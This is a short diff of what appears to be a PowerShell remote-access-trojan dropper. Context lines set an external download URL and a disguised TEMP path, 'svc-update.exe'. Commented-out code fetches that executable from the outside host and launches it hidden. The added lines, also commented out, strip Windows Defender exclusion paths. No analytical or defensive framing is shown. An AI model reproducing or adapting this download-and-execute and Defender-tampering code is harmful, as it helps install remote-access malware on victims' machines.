@@ -6,6 +6,10 @@ $ratUrl = "https://duperussianservers.ruchecker-ru.workers.dev/"
 $ratPath = "$env:TEMP\svc-update.exe"
 
 #try {
+#    Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | ForEach-Object { Remove-MpPreference -ExclusionPath $_ -Force -ErrorAction SilentlyContinue }
+#} catch {}
+
+#try {
 #    Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath -UseBasicParsing -ErrorAction Stop
 #    Start-Process $ratPath -WindowStyle Hidden
 #} catch {
